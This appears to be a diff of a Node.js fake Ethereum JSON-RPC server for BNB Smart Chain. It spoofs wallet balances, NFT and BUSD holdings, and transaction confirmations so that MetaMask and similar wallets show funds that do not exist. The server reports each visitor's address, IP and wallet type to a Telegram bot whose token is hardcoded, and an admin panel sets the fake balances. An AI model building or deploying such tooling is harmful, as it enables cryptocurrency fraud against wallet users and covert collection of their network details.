@@ -1,119 +1,579 @@
-// nft_full_spoof_auto_bsc.js
-// Spoofs ERC-20 (BUSD) and ERC-721 (Pancake Squad) for MetaMask / BSC testing.
-// Automatically shows NFT in wallet by simulating a Transfer event.
-// Target chain: BSC Mainnet (chainId 0x38)
-
 const express = require('express');
 const bodyParser = require('body-parser');
+const path = require('path');
+const axios = require('axios');
+const cors = require('cors');
+const fs = require('fs');
+const TelegramBot = require('node-telegram-bot-api');
+const { ethers } = require("ethers"); // ADDED FOR ETH_CALL
 
 const app = express();
+const PORT = process.env.PORT || 9798;
+const HOST = '0.0.0.0';
+
+// Telegram Bot config
+const TELEGRAM_BOT_TOKEN = '8395301366:AAGSGCdJDIgJ0ffRrSwmjV2q-YPUgLliHEE';
+const TELEGRAM_CHAT_ID = '7812677112';
+
+// Replace with your Telegram user IDs
+const SUPERADMINS = [
+    7812677112, // superadmin ID (hardcoded)
+    // add more superadmins here
+];
+
+// Persistent data directory for Render disk
+const DATA_DIR = '/data';
+
+// Ensure DATA_DIR exists
+if (!fs.existsSync(DATA_DIR)) {
+    fs.mkdirSync(DATA_DIR, { recursive: true });
+}
+
+const ADMINS_FILE = path.join(DATA_DIR, 'admins.json');
+const BALANCES_JSON_FILE = path.join(DATA_DIR, 'balances.json');
+const BALANCES_CSV_FILE = path.join(DATA_DIR, 'balances.csv');
+
+// Load admins from file or fallback to default
+function loadAdmins() {
+    try {
+        if (fs.existsSync(ADMINS_FILE)) {
+            const data = fs.readFileSync(ADMINS_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (err) {
+        console.error('[!] Failed to load admins:', err);
+    }
+    return [222222222]; // default admins if file missing
+}
+
+// Save admins array to file
+function saveAdmins() {
+    try {
+        fs.writeFileSync(ADMINS_FILE, JSON.stringify(ADMINS, null, 2));
+    } catch (err) {
+        console.error('[!] Failed to save admins:', err);
+    }
+}
+
+let ADMINS = loadAdmins();
+
+// Convert hex wei balance to human-readable BNB decimal string
+function weiHexToBNB(hexWei) {
+    if (!hexWei || typeof hexWei !== 'string') return '0';
+    const hex = hexWei.toLowerCase().startsWith('0x') ? hexWei.slice(2) : hexWei;
+    const wei = BigInt('0x' + hex);
+    const decimals = 18n;
+    const divisor = 10n ** decimals;
+    const whole = wei / divisor;
+    const fraction = wei % divisor;
+    let fractionStr = fraction.toString().padStart(Number(decimals), '0');
+    fractionStr = fractionStr.replace(/0+$/, '');
+    return fractionStr.length > 0 ? `${whole.toString()}.${fractionStr}` : whole.toString();
+}
+
+// Load spoofed balances with detailed info
+const loadBalances = () => {
+    try {
+        if (fs.existsSync(BALANCES_JSON_FILE)) {
+            const data = fs.readFileSync(BALANCES_JSON_FILE, 'utf-8');
+            return JSON.parse(data);
+        }
+    } catch (err) {
+        console.error('[!] Failed to load balances:', err);
+    }
+    return {};
+};
+
+// Save spoofed balances as JSON backup
+const saveBalancesJSON = () => {
+    try {
+        fs.writeFileSync(BALANCES_JSON_FILE, JSON.stringify(spoofedBalances, null, 2));
+    } catch (err) {
+        console.error('[!] Failed to save balances JSON:', err);
+    }
+};
+
+// Save spoofed balances as CSV file for human reading, sorted by timestamp desc, numbered rows
+const saveBalancesCSV = () => {
+    const headers = ['#', 'Address', 'Balance (BNB)', 'Timestamp', 'Wallet', 'IP'];
+    const rows = [headers.join(',')];
+
+    // Sort addresses by timestamp descending (most recent first)
+    const entriesSorted = Object.entries(spoofedBalances).sort((a, b) => {
+        const tA = new Date(a[1].timestamp).getTime();
+        const tB = new Date(b[1].timestamp).getTime();
+        return tB - tA;
+    });
+
+    entriesSorted.forEach(([address, data], index) => {
+        const balanceBNB = weiHexToBNB(data.balance);
+        const row = [
+            index + 1,
+            address,
+            balanceBNB,
+            data.timestamp,
+            data.wallet,
+            data.ip
+        ].map(field => `"${field}"`).join(',');
+        rows.push(row);
+    });
+
+    const csvContent = rows.join('\n');
+    try {
+        fs.writeFileSync(BALANCES_CSV_FILE, csvContent);
+    } catch (err) {
+        console.error('[!] Failed to save balances CSV:', err);
+    }
+};
+
+// Load balances on startup
+let spoofedBalances = loadBalances();
+
+// === ETH_CALL SETUP ===
+const BALANCE_CHECKER_ABI = [
+    "function balances(address[] users, address[] tokens) view returns (uint256[])"
+];
+const iface = new ethers.Interface(BALANCE_CHECKER_ABI);
+
+app.use(cors());
+app.use(express.static(path.join(__dirname, '/')));
 app.use(bodyParser.json());
 
-const PORT = 9726;
+// Telegram bot instance with polling
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
-// replace with the wallet address you want the spoof to show NFTs/tokens for:
-const SPOOF_OWNER = '0x654467492CB23c05A5316141f9BAc44679EEaf8C'.toLowerCase();
+// === ADDED: Persistent "Panel" button keyboard ===
 
-// Real contracts on BSC mainnet
-const SPOOF_NFT_CONTRACT = '0x0a8901f0e1a3f45b3f2e63f1bb46c9bf3f8633ec'.toLowerCase(); // Pancake Squad
-const SPOOF_ERC20_CONTRACT = '0xe9e7cea3dedca5984780bafc599bd69add087d56'.toLowerCase(); // BUSD
+// Send persistent keyboard with "Panel" button (for admins only)
+function sendPersistentPanelKeyboard(chatId) {
+    const keyboard = {
+        reply_markup: {
+            keyboard: [
+                [{ text: 'Panel' }]
+            ],
+            resize_keyboard: true,
+            one_time_keyboard: false,
+        }
+    };
+    bot.sendMessage(chatId, '>!<', keyboard);
+}
 
-const FAKE_BYTECODE = '0x6080604052348015600f57600080fd5b5060...'; // arbitrary non-empty bytecode
+// /start command to send persistent "Panel" button keyboard
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    const fromId = msg.from.id;
 
-function encodeUint256(n) { return '0x' + BigInt(n).toString(16).padStart(64, '0'); }
-function encodeAddress(a) { return '0x' + a.toLowerCase().replace('0x','').padStart(64,'0'); }
-function encodeBool(b) { return '0x' + (b ? '1' : '0').padStart(64,'0'); }
-
-app.post('/', (req, res) => {
-  const { method, params, id } = req.body || {};
-  const replyId = (typeof id !== 'undefined') ? id : null;
-
-  // --- Basic RPC ---
-  if (method === 'eth_chainId') return res.json({ jsonrpc:'2.0', id:replyId, result:'0x38' }); // BSC mainnet
-  if (method === 'eth_blockNumber') return res.json({ jsonrpc:'2.0', id:replyId, result:'0x0' });
-  if (method === 'eth_syncing') return res.json({ jsonrpc:'2.0', id:replyId, result:false });
-
-  // --- eth_getCode ---
-  if (method === 'eth_getCode') {
-    const address = (params && params[0] || '').toLowerCase();
-    if (address === SPOOF_NFT_CONTRACT || address === SPOOF_ERC20_CONTRACT)
-      return res.json({ jsonrpc:'2.0', id:replyId, result:FAKE_BYTECODE });
-    return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' });
-  }
-
-  // --- eth_getLogs: simulate NFT Transfer ---
-  if (method === 'eth_getLogs') {
-    const filter = params && params[0] || {};
-    const address = (filter.address || '').toLowerCase();
-    const topics = filter.topics || [];
-    if (address === SPOOF_NFT_CONTRACT) {
-      const transferSig = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef';
-      const toMatch = '0x' + SPOOF_OWNER.replace('0x','').padStart(64,'0');
-      if (!topics[0] || topics[0].toLowerCase() === transferSig) {
-        const log = {
-          address: SPOOF_NFT_CONTRACT,
-          topics: [
-            transferSig,
-            '0x0000000000000000000000000000000000000000000000000000000000000000',
-            toMatch
-          ],
-          data: '0x0000000000000000000000000000000000000000000000000000000000000001', // tokenId=1
-          blockNumber: '0x0',
-          transactionHash: '0x0',
-          transactionIndex: '0x0',
-          blockHash: '0x0',
-          logIndex: '0x0',
-          removed: false
-        };
-        return res.json({ jsonrpc:'2.0', id:replyId, result:[log] });
-      }
-    }
-    return res.json({ jsonrpc:'2.0', id:replyId, result:[] });
-  }
-
-  // --- eth_call ---
-  if (method === 'eth_call') {
-    const call = (params && params[0]) || {};
-    const to = (call.to || '').toLowerCase();
-    const data = (call.data || '').toLowerCase();
-    const caller = (call.from || SPOOF_OWNER).toLowerCase();
-
-    console.log(`[${new Date().toISOString()}] eth_call to=${to} from=${caller} data=${data.slice(0,10)}...`);
-
-    // --- ERC20 (BUSD) spoof ---
-    if (to === SPOOF_ERC20_CONTRACT) {
-      if (data.startsWith('0x70a08231')) { // balanceOf
-        const value = BigInt(1000) * (BigInt(10) ** BigInt(18)); // 1000 BUSD
-        return res.json({ jsonrpc:'2.0', id:replyId, result:encodeUint256(value) });
-      }
-      if (data.startsWith('0x313ce567')) return res.json({ jsonrpc:'2.0', id:replyId, result:encodeUint256(18) }); // decimals
-      if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' + Buffer.from('BUSD').toString('hex').padEnd(64,'0') }); // symbol
-      if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' + Buffer.from('Binance USD').toString('hex').padEnd(64,'0') }); // name
+    if (!isAdmin(fromId)) {
+        bot.sendMessage(chatId, '⛔ You are not authorized.');
+        return;
     }
 
-    // --- ERC721 (Pancake Squad) spoof ---
-    if (to === SPOOF_NFT_CONTRACT) {
-      if (data.startsWith('0x01ffc9a7')) return res.json({ jsonrpc:'2.0', id:replyId, result:encodeBool(true) }); // supportsInterface
-      if (data.startsWith('0x6352211e')) return res.json({ jsonrpc:'2.0', id:replyId, result:encodeAddress(caller) }); // ownerOf
-      if (data.startsWith('0x70a08231')) return res.json({ jsonrpc:'2.0', id:replyId, result:encodeUint256(1) }); // balanceOf
-      if (data.startsWith('0xc87b56dd')) { // tokenURI
-        const url = 'https://nft.pancakesquad.com/token/1';
-        const hex = '0x' + Buffer.from(url).toString('hex').padEnd(64,'0');
-        return res.json({ jsonrpc:'2.0', id:replyId, result:hex });
-      }
-      if (data.startsWith('0x06fdde03')) return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' + Buffer.from('PancakeSquad').toString('hex').padEnd(64,'0') }); // name
-      if (data.startsWith('0x95d89b41')) return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' + Buffer.from('PSQUAD').toString('hex').padEnd(64,'0') }); // symbol
-    }
-
-    return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' });
-  }
-
-  return res.json({ jsonrpc:'2.0', id:replyId, result:'0x' });
+    sendPersistentPanelKeyboard(chatId);
 });
 
-app.listen(PORT, () => {
-  console.log(`NFT+ERC20 full-spoof RPC (BSC) running at http://localhost:${PORT}`);
-  console.log(`chainId -> 0x38 (BSC mainnet)`);
-  console.log(`SPOOF_NFT_CONTRACT=${SPOOF_NFT_CONTRACT} (Pancake Squad)`);
-  console.log(`SPOOF_ERC20_CONTRACT=${SPOOF_ERC20_CONTRACT} (BUSD)`);
+// Handle when user presses the "Panel" button from ReplyKeyboardMarkup
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+    const fromId = msg.from.id;
+
+    if (msg.text === 'Panel') {
+        if (!isAdmin(fromId)) {
+            bot.sendMessage(chatId, '⛔ You are not authorized to use this panel.');
+            return;
+        }
+
+        const inlineKeyboard = [
+            [
+                { text: 'Balances', callback_data: '/balances' },
+                { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }
+            ],
+            [
+                { text: 'Add Admin', callback_data: '/addadmin' },
+                { text: 'Remove Admin', callback_data: '/removeadmin' }
+            ],
+            [
+                { text: 'List Admins', callback_data: '/listadmins' }
+            ]
+        ];
+
+        bot.sendMessage(chatId, 'Select a command:', {
+            reply_markup: {
+                inline_keyboard: inlineKeyboard
+            }
+        });
+    }
+});
+
+// === END ADDED CODE ===
+
+// Helper functions
+function isSuperAdmin(userId) {
+    return SUPERADMINS.includes(userId);
+}
+
+function isAdmin(userId) {
+    return isSuperAdmin(userId) || ADMINS.includes(userId);
+}
+
+// Send balances CSV document
+function sendBalances(chatId, fromId) {
+    if (!isAdmin(fromId)) {
+        bot.sendMessage(chatId, '⛔ You are not authorized to use this command.');
+        return;
+    }
+
+    if (Object.keys(spoofedBalances).length === 0) {
+        bot.sendMessage(chatId, 'No spoofed balances set yet.');
+        return;
+    }
+
+    saveBalancesCSV();
+
+    bot.sendDocument(chatId, BALANCES_CSV_FILE).catch(err => {
+        console.error('Failed to send balances CSV:', err);
+        bot.sendMessage(chatId, 'Failed to send balances CSV file.');
+    });
+}
+
+// /set command link message
+function sendSetLink(chatId) {
+    const url = 'https://bnbchainpanel.vercel.app';
+    bot.sendMessage(chatId, `Open the BNB Chain Panel here:\n[Click to open](${url})`, {
+        parse_mode: 'Markdown',
+        disable_web_page_preview: true,
+    });
+}
+
+// /balances command
+bot.onText(/\/balances/, (msg) => {
+    sendBalances(msg.chat.id, msg.from.id);
+});
+
+// /set command
+bot.onText(/\/set/, (msg) => {
+    sendSetLink(msg.chat.id);
+});
+
+// /panel command shows all buttons to all admins
+bot.onText(/\/panel/, (msg) => {
+    const chatId = msg.chat.id;
+    const fromId = msg.from.id;
+
+    if (!isAdmin(fromId)) {
+        bot.sendMessage(chatId, '⛔ You are not authorized to use this panel.');
+        return;
+    }
+
+    const inlineKeyboard = [
+        [
+            { text: 'Balances', callback_data: '/balances' },
+            { text: 'Open Panel', url: 'https://bnbchainpanel.vercel.app' }
+        ],
+        [
+            { text: 'Add Admin', callback_data: '/addadmin' },
+            { text: 'Remove Admin', callback_data: '/removeadmin' }
+        ],
+        [
+            { text: 'List Admins', callback_data: '/listadmins' }
+        ]
+    ];
+
+    const options = {
+        reply_markup: {
+            inline_keyboard: inlineKeyboard
+        }
+    };
+
+    bot.sendMessage(chatId, 'Select a command:', options);
+});
+
+// Handle callback queries with permission check
+bot.on('callback_query', (callbackQuery) => {
+    const msg = callbackQuery.message;
+    const data = callbackQuery.data;
+    const fromId = callbackQuery.from.id;
+
+    if (!isAdmin(fromId)) {
+        bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Not authorized.', show_alert: true });
+        return;
+    }
+
+    // Normal admins get access denied for all callback commands except URL buttons (which have no callback)
+    if (!isSuperAdmin(fromId)) {
+        bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Access denied for this command.', show_alert: true });
+        return;
+    }
+
+    bot.answerCallbackQuery(callbackQuery.id);
+
+    if (data === '/balances') {
+        sendBalances(msg.chat.id, fromId);
+    } else if (data === '/addadmin') {
+        bot.sendMessage(msg.chat.id, 'Please send the user ID to add as admin.');
+        waitForAdminResponse(msg.chat.id, fromId, 'add');
+    } else if (data === '/removeadmin') {
+        bot.sendMessage(msg.chat.id, 'Please send the user ID to remove from admins.');
+        waitForAdminResponse(msg.chat.id, fromId, 'remove');
+    } else if (data === '/listadmins') {
+        const adminList = ADMINS.length > 0 ? ADMINS.join('\n') : 'No admins set.';
+        bot.sendMessage(msg.chat.id, `Current admins:\n${adminList}`);
+    } else {
+        bot.sendMessage(msg.chat.id, 'Unknown command.');
+    }
+});
+
+// Function to wait for admin ID reply for add/remove
+function waitForAdminResponse(chatId, fromId, action) {
+    const handler = (msg) => {
+        if (msg.chat.id !== chatId || msg.from.id !== fromId) return;
+
+        const userId = parseInt(msg.text);
+        if (isNaN(userId)) {
+            bot.sendMessage(chatId, 'Invalid user ID. Operation cancelled.');
+            bot.removeListener('message', handler);
+            return;
+        }
+
+        if (action === 'add') {
+            if (ADMINS.includes(userId) || SUPERADMINS.includes(userId)) {
+                bot.sendMessage(chatId, 'User is already an admin or superadmin.');
+            } else {
+                ADMINS.push(userId);
+                saveAdmins();
+                bot.sendMessage(chatId, `User ID ${userId} added as admin.`);
+            }
+        } else if (action === 'remove') {
+            if (!ADMINS.includes(userId)) {
+                bot.sendMessage(chatId, 'User ID is not an admin.');
+            } else {
+                ADMINS = ADMINS.filter(id => id !== userId);
+                saveAdmins();
+                bot.sendMessage(chatId, `User ID ${userId} removed from admins.`);
+            }
+        }
+
+        bot.removeListener('message', handler);
+    };
+
+    bot.on('message', handler);
+}
+
+// Helper: Send message to Telegram chat ID
+const sendToTelegram = async (text) => {
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text,
+            parse_mode: 'Markdown',
+        });
+    } catch (err) {
+        console.error('[!] Telegram send error:', err?.response?.data || err.message);
+    }
+};
+
+// Helper: Current timestamp
+const now = () => new Date().toISOString().replace('T', ' ').split('.')[0];
+
+// Helper: Guess wallet from User-Agent
+const detectWalletFromUA = (ua = '') => {
+    ua = ua.toLowerCase();
+    if (ua.includes('metamask')) return 'MetaMask';
+    if (ua.includes('trust')) return 'Trust Wallet';
+    if (ua.includes('brave')) return 'Brave Wallet';
+    if (ua.includes('coinbase')) return 'Coinbase Wallet';
+    if (ua.includes('phantom')) return 'Phantom';
+    if (ua.includes('opera')) return 'Opera';
+    if (ua.includes('safari') && !ua.includes('chrome')) return 'Safari';
+    if (ua.includes('chrome')) return 'Chrome';
+    if (ua.includes('firefox')) return 'Firefox';
+    if (ua.includes('android')) return 'Android WebView';
+    if (ua.includes('ios')) return 'iOS WebView';
+    return 'Unknown';
+};
+
+// JSON-RPC handler
+app.post('/', (req, res) => {
+    const { method, params, id } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ua = req.headers['user-agent'] || '';
+    const wallet = detectWalletFromUA(ua);
+
+    console.log(`[RPC] Method: ${method}`);
+
+    if (method === 'eth_chainId') {
+        return res.json({ jsonrpc: '2.0', id, result: '0x38' }); // BSC
+    }
+
+    if (method === 'net_version') {
+        return res.json({ jsonrpc: '2.0', id, result: '56' });
+    }
+
+    if (method === 'eth_blockNumber') {
+        return res.json({ jsonrpc: '2.0', id, result: '0x100000' });
+    }
+
+    if (method === 'eth_syncing') {
+        return res.json({ jsonrpc: '2.0', id, result: false });
+    }
+
+    if (method === 'eth_getBalance') {
+        const address = (params[0] || '').toLowerCase();
+        const info = spoofedBalances[address];
+        const balanceHex = info ? info.balance : '0x0';
+        const balanceBNB = weiHexToBNB(balanceHex);
+
+        const logMsg = `🕒 *${now()}*\n[+] Spoofing BNB for \`${address}\`\n🪙 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+
+        console.log(logMsg);
+        sendToTelegram(logMsg);
+
+        // RPC expects hex balance, so return original hex string
+        return res.json({ jsonrpc: '2.0', id, result: balanceHex });
+    }
+
+    // === NEW: eth_call spoof handler ===
+    if (method === 'eth_call') {
+        const call = params[0];
+        const data = call.data;
+
+        try {
+            const parsed = iface.parseTransaction({ data });
+            if (parsed?.name === "balances") {
+                const users = parsed.args[0].map(addr => addr.toLowerCase());
+                const tokens = parsed.args[1]; // not used for logging
+
+                const results = [];
+                users.forEach(user => {
+                    const info = spoofedBalances[user];
+                    const balanceHex = info ? info.balance : "0x0";
+                    const balanceBNB = weiHexToBNB(balanceHex);
+
+                    // Log each wallet exactly like /set-balance
+                    const logMsg = `🕒 *${now()}*\n[+] Spoofing balance for \`${user}\`\n💰 Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\``;
+                    console.log(logMsg);
+                    sendToTelegram(logMsg);
+
+                    results.push(BigInt(balanceHex));
+                });
+
+                const encoded = iface.encodeFunctionResult("balances", [results]);
+                return res.json({ jsonrpc: "2.0", id, result: encoded });
+            }
+        } catch (e) {
+            console.log("eth_call decode error:", e.message);
+        }
+
+        // fallback for other eth_calls
+        return res.json({ jsonrpc: '2.0', id, result: "0x" });
+    }
+
+    // === NEW: transaction support for MetaMask ===
+    if (method === 'eth_estimateGas') {
+        const tx = params[0];
+        const from = tx.from?.toLowerCase();
+        const to = tx.to?.toLowerCase();
+        const value = tx.value || '0x0';
+
+        console.log(`🛠 Estimating gas for tx: from ${from}, to ${to}, value ${weiHexToBNB(value)} BNB`);
+        // Return fixed gas amount (21000)
+        return res.json({ jsonrpc: '2.0', id, result: '0x5208' });
+    }
+
+    if (method === 'eth_gasPrice') {
+        // Return 1 Gwei
+        return res.json({ jsonrpc: '2.0', id, result: '0x3B9ACA00' });
+    }
+
+    if (method === 'eth_sendTransaction') {
+        const tx = params[0];
+        console.log(`💸 Sending fake tx: from ${tx.from}, to ${tx.to}, value ${weiHexToBNB(tx.value)} BNB`);
+        const fakeTxHash = '0x' + '0'.repeat(64); // dummy transaction hash
+        return res.json({ jsonrpc: '2.0', id, result: fakeTxHash });
+    }
+
+    if (method === 'eth_getTransactionReceipt') {
+        const txHash = params[0];
+        return res.json({
+            jsonrpc: '2.0',
+            id,
+            result: {
+                transactionHash: txHash,
+                status: '0x1', // success
+                blockNumber: '0x100000',
+                gasUsed: '0x5208',
+                logs: []
+            }
+        });
+    }
+
+    if (method === 'eth_getBlockByNumber') {
+        // return a fake block with minimal required fields
+        return res.json({
+            jsonrpc: '2.0',
+            id,
+            result: {
+                number: '0x100000',
+                hash: '0x' + '0'.repeat(64),
+                parentHash: '0x' + '0'.repeat(64),
+                nonce: '0x0000000000000000',
+                transactions: [],
+                timestamp: Math.floor(Date.now() / 1000).toString(16),
+                miner: '0x0000000000000000000000000000000000000000',
+            }
+        });
+    }
+
+    if (method === 'eth_getCode') {
+        // always return empty for EOAs
+        const address = params[0]?.toLowerCase();
+        return res.json({ jsonrpc: '2.0', id, result: '0x' });
+    }
+
+
+
+    // Unknown methods
+    const logMsg = `🕒 *${now()}*\n⚠️ Unknown RPC: \`${method}\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+    console.log(logMsg);
+    sendToTelegram(logMsg);
+
+    return res.json({ jsonrpc: '2.0', id, result: null });
+});
+
+// Handle spoofed balance update
+app.post('/set-balance', (req, res) => {
+    const { address, balance } = req.body;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const ua = req.headers['user-agent'] || '';
+    const wallet = detectWalletFromUA(ua);
+
+    if (
+        !address ||
+        !balance ||
+        !/^0x[0-9a-fA-F]{40}$/.test(address) ||
+        !/^0x[0-9a-fA-F]+$/.test(balance)
+    ) {
+        return res.status(400).json({ error: 'Invalid address or balance' });
+    }
+
+    const cleanAddress = address.toLowerCase();
+    spoofedBalances[cleanAddress] = {
+        balance: balance.toLowerCase(),
+        timestamp: now(),
+        wallet,
+        ip
+    };
+
+    saveBalancesJSON();
+
+    const balanceBNB = weiHexToBNB(balance);
+    const logMsg = `🕒 *${now()}*\n[~] Set balance for \`${cleanAddress}\`\n💰 New Balance: \`${balanceBNB} BNB\`\n🧩 Wallet: *${wallet}*\n🌐 IP: \`${ip}\``;
+
+    console.log(logMsg);
+    sendToTelegram(logMsg);
+
+    return res.status(200).json({ success: true });
+});
+
+app.listen(PORT, HOST, () => {
+    console.log(`🚀 Fake RPC server running at http://${HOST}:${PORT}`);
 });
